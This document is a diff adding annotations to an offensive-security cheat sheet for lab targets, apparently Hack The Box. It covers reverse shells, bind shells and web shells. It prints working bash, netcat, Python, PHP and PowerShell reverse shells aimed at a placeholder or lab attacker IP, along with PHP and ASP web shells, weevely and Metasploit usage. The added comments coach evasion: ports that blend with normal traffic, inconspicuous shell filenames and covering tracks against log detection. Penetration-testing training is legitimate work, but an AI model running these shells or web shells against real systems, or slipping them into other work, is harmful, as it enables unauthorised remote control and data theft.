@@ -115,26 +115,31 @@ ATTACK FLOW:
 ```bash
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
 ```
+> Opens an interactive bash shell and redirects all I/O over a TCP connection back to your listener. Replace ATTACKER_IP with your tun0 IP and PORT with your nc listener port (e.g., 4444).
 
 **Bash Alternative (if /dev/tcp not available)**
 ```bash
 bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
 ```
+> Same as the TCP version but uses UDP — useful when TCP is filtered. Note that UDP is connectionless so the shell may be less stable; set your listener with `nc -lvnup PORT`.
 
 **Netcat Reverse Shell**
 ```bash
 nc -e /bin/sh ATTACKER_IP PORT
 ```
+> Uses netcat's `-e` flag to execute /bin/sh on connection. Note: `-e` is not available in all netcat builds (e.g., OpenBSD nc); use the mkfifo method as a fallback.
 
 **Python Reverse Shell**
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+> Python one-liner reverse shell — useful when bash and netcat are unavailable. Replace ATTACKER_IP and PORT. If `python` isn't found, try `python3`.
 
 **PHP Reverse Shell**
 ```php
 php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+> PHP reverse shell via `fsockopen` — works when PHP is installed as a CLI tool. Replace ATTACKER_IP and PORT; file descriptor 3 is the open socket.
 
 ### Attacker Setup (Receiving Reverse Shell)
 
@@ -146,6 +151,7 @@ nc -lvnp 4444
 # -n = no DNS resolution
 # -p = port
 ```
+> Sets up your listener on port 4444 to catch incoming reverse shells. Change the port number to match whatever you put in the target-side reverse shell command.
 
 **Using Metasploit (Advanced)**
 ```bash
@@ -155,6 +161,7 @@ set LHOST ATTACKER_IP
 set LPORT 4444
 run
 ```
+> MSF's generic handler catches any reverse shell payload. Swap the PAYLOAD to match what you generated (e.g., `linux/x64/meterpreter/reverse_tcp` for 64-bit Linux). Use `tun0` for LHOST on HTB.
 
 ### Advantages ✅
 - ✅ Very common and reliable
@@ -238,6 +245,7 @@ ATTACK FLOW:
 ```bash
 bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
 ```
+> Binds an interactive bash shell to port 4444 on all interfaces. After this runs on the target, connect from your machine with `nc TARGET_IP 4444`. Requires `/dev/tcp` support in the bash build.
 
 **Netcat Bind Shell**
 ```bash
@@ -248,11 +256,13 @@ nc -lvnp 4444 -e /bin/sh
 # -p = port
 # -e = execute /bin/sh on connection
 ```
+> Runs on the target — listens on port 4444 and attaches /bin/sh to any incoming connection. Attacker then connects with `nc TARGET_IP 4444`.
 
 **Python Bind Shell**
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+> Python bind shell — listens on port 4444 and pipes /bin/sh to the first incoming connection. Use when netcat's `-e` flag isn't available. Replace 4444 with any open port; connect with `nc TARGET_IP 4444`.
 
 ### Attacker Connection (Connecting to Bind Shell)
 
@@ -260,12 +270,14 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```bash
 nc TARGET_IP 4444
 ```
+> Connects to the bind shell listener on the target. Replace TARGET_IP and port with the target's address and whatever port the bind shell is listening on.
 
 **Using SSH Tunnel (If SSH available)**
 ```bash
 ssh -L 4444:localhost:4444 user@TARGET_IP
 nc localhost 4444
 ```
+> `-L` creates a local port forward — tunnels your local port 4444 to the target's port 4444 over SSH. Useful when the bind port isn't directly reachable from your machine.
 
 ### Advantages ✅
 - ✅ Works if outbound connections from target are blocked
@@ -362,6 +374,7 @@ curl "http://TARGET_IP/shell.php?cmd=ls%20-la"
 curl "http://TARGET_IP/shell.php?cmd=whoami"
 curl "http://TARGET_IP/shell.php?cmd=id"
 ```
+> Executes commands by passing them in the `cmd` URL parameter. URL-encode spaces as `%20`; use `--data "cmd=ls -la"` for POST-based shells to avoid command-line quoting issues.
 
 **ASP Web Shell (Windows)**
 ```asp
@@ -400,12 +413,14 @@ php -r '$_REQUEST["cmd"] && system($_REQUEST["cmd"]);'
 # ASP one-liner
 <%@ eval(Request.Item[chr(99)+chr(109)+chr(100)]) %>
 ```
+> The PHP one-liner executes commands passed via the `cmd` GET/POST parameter. The Python line starts a file server to download files, not a web shell. The ASP line evaluates the `cmd` parameter using char codes to obscure the parameter name.
 
 **Tool: weevely (Web Shell Generator)**
 ```bash
 weevely generate password shell.php
 # Generates encrypted web shell with backdoor password
 ```
+> Generates an encrypted PHP web shell saved as `shell.php`, protected by `password`. Upload the file to the target, then connect interactively with `weevely http://TARGET/shell.php password`.
 
 ### How to Access Web Shell
 
@@ -418,6 +433,7 @@ http://target.com/shell.php?cmd=whoami
 ```bash
 curl "http://target.com/shell.php?cmd=ls%20-la"
 ```
+> Sends a command to the web shell via GET request. URL-encode spaces as `%20`; for commands with special characters use `--data "cmd=your command"` (POST) to avoid shell escaping issues.
 
 **Method 3: Specialized Tools**
 ```bash
@@ -427,6 +443,7 @@ weevely http://target.com/shell.php password
 # Custom Python script
 python exploit.py --url http://target.com/shell.php --cmd "id"
 ```
+> `weevely` gives you a pseudo-interactive session through the encrypted shell. The Python script pattern shows how to wrap web shell calls in automation — replace the URL, parameter name, and password to match your deployed shell.
 
 ### Advantages ✅
 - ✅ Uses standard HTTP protocol (hard to block)
@@ -465,6 +482,7 @@ auditctl -l | grep exec
 # Web server logs for suspicious patterns
 grep "cmd=" /var/log/apache2/access.log
 ```
+> These are detection/defense commands — useful to know as an attacker so you can cover your tracks (clean web shells, avoid logging `cmd=` patterns with POST instead of GET).
 
 **How to prevent:**
 - Disable dangerous PHP functions: `shell_exec`, `system`, `exec`, `passthru`
@@ -554,6 +572,7 @@ grep "cmd=" /var/log/apache2/access.log
 ```bash
 nc -lvnp 1234
 ```
+> Starts your listener on port 1234. Run this BEFORE triggering the exploit on the target. Change the port to avoid conflicts; use 443 or 80 to blend with normal traffic when egress filtering is strict.
 
 **Flag Breakdown:**
 | Flag | Meaning | Purpose |
@@ -583,6 +602,7 @@ Action: Waiting for target to connect
 ```bash
 ip a
 ```
+> Lists all network interfaces and their IP addresses. On HTB, look for the `tun0` interface for your VPN IP — that's what you put in the reverse shell command on the target.
 
 **What to Look For:**
 ```bash
@@ -614,6 +634,7 @@ $ ip a
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
+> The outer `bash -c` is needed when injecting through web apps or other contexts that don't directly spawn bash. Replace 10.10.10.10 with your tun0 IP and 1234 with your listener port.
 
 **Breakdown:**
 ```
@@ -650,6 +671,7 @@ user@target:~$
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 > /tmp/f
 ```
+> Uses a named pipe (FIFO) for bidirectional I/O — works on systems where `/dev/tcp` is disabled. Replace 10.10.10.10 and 1234; `/tmp` must be writable on the target.
 
 **Breakdown:**
 ```
@@ -682,6 +704,7 @@ cat /tmp/f|                            # Read from FIFO
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10' ,1234); $s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $data 2>&1 | Out-String); $sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
+> PowerShell reverse shell — creates a TCP connection to your listener, reads commands, executes them with `iex`, and sends output back with a PS prompt. Replace 10.10.10.10 and 1234 with your tun0 IP and listener port. `-nop` bypasses execution policy.
 
 **Breakdown (Simplified):**
 ```powershell
@@ -770,26 +793,31 @@ bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
 ```bash
 bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
 ```
+> Bash reverse shell — redirects all I/O over TCP. Replace 10.10.10.10 with your tun0 IP and 1234 with your listener port.
 
 **Linux - Netcat:**
 ```bash
 nc -e /bin/sh 10.10.10.10 1234
 ```
+> Netcat reverse shell using `-e` to attach /bin/sh on connection. Not all nc builds support `-e`; fall back to the mkfifo method if this fails.
 
 **Linux - Python:**
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+> Python reverse shell — connects to your listener and redirects stdin/stdout/stderr to the socket. Replace the IP and port. Try `python3` if `python` is not in PATH.
 
 **Windows - PowerShell (Full):**
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234); $s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $data 2>&1 | Out-String); $sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
+> Full PowerShell reverse shell. Replace 10.10.10.10 and 1234. Start your listener with `nc -lvnp 1234` before triggering this on the target.
 
 **Windows - PowerShell (Shortened):**
 ```powershell
 powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object System.text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($r2);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()"
 ```
+> Shortened version of the PowerShell reverse shell — identical functionality, fewer characters. Useful when character limits apply (e.g., command injection fields). Same IP/port substitution applies.
 
 ---
 
@@ -1026,6 +1054,7 @@ Attacker → Target
 ```bash
 nc -lvnp 4444 -e /bin/sh
 ```
+> Run this on the target after exploiting RCE. It listens on port 4444 and attaches /bin/sh to any connection. Connect from your machine with `nc TARGET_IP 4444`. Requires a netcat build with `-e` support.
 
 **Flags Breakdown:**
 | Flag | Meaning |
@@ -1591,6 +1620,7 @@ user@target:~$
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
+> Spawns a proper PTY (pseudo-terminal) which enables arrow keys, command history, and tab completion. If `python` isn't found, try `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
 
 **Breakdown:**
 ```
@@ -1646,6 +1676,7 @@ $
 ```bash
 stty raw -echo
 ```
+> Sets your local terminal to raw mode (passes keystrokes directly) and disables local echo. Run this immediately after pressing Ctrl+Z — the terminal will look blank, that's normal.
 
 **Breakdown:**
 ```
@@ -1674,6 +1705,7 @@ stty                    # Set terminal type
 ```bash
 fg
 ```
+> Brings the backgrounded netcat process back to the foreground. Press Enter once or twice after running this to get the shell prompt to appear.
 
 **Then Press Enter Twice**
 
@@ -1724,6 +1756,7 @@ Display looks broken
 ```bash
 echo $TERM
 ```
+> Prints your local terminal type (usually `xterm-256color`). You'll set this same value on the remote shell so programs know what terminal they're running in.
 
 **Example Output:**
 ```
@@ -1735,6 +1768,7 @@ xterm-256color
 ```bash
 stty size
 ```
+> Outputs `rows columns` for your local terminal window. Use these numbers in the `stty rows X columns Y` command on the remote shell to fix display wrapping.
 
 **Example Output:**
 ```
@@ -1751,11 +1785,13 @@ stty size
 ```bash
 export TERM=xterm-256color
 ```
+> Sets the terminal type on the remote shell so programs like vim and less render correctly. Replace `xterm-256color` with whatever your local `echo $TERM` returned.
 
 **Command 2: Set rows and columns**
 ```bash
 stty rows 67 columns 318
 ```
+> Resizes the remote terminal to match your local window. Replace 67 and 318 with the actual values from your local `stty size` output.
 
 **Full Example:**
 ```bash
@@ -2006,6 +2042,7 @@ curl http://target.com/shell.php?cmd=whoami
 curl http://target.com/shell.php?cmd=pwd
 # Output: /var/www/html
 ```
+> Basic command execution test via GET parameter. Replace `target.com/shell.php` with your actual shell URL; URL-encode special characters when passing complex commands.
 
 ---
 
@@ -2099,6 +2136,7 @@ ls /usr/local/nginx/html/
 # Or check Apache config
 cat /etc/apache2/sites-enabled/000-default.conf
 ```
+> Confirms which directory is the web root before writing your shell. The Apache config file's `DocumentRoot` directive shows the exact path if the standard locations don't exist.
 
 **Step 2: Write web shell directly**
 
@@ -2106,6 +2144,7 @@ cat /etc/apache2/sites-enabled/000-default.conf
 ```bash
 echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 ```
+> Writes the one-liner PHP shell directly to the webroot via your existing RCE. The web server must be writable by the current process user (usually www-data); pick a less obvious filename than `shell.php`.
 
 **For Windows IIS:**
 ```
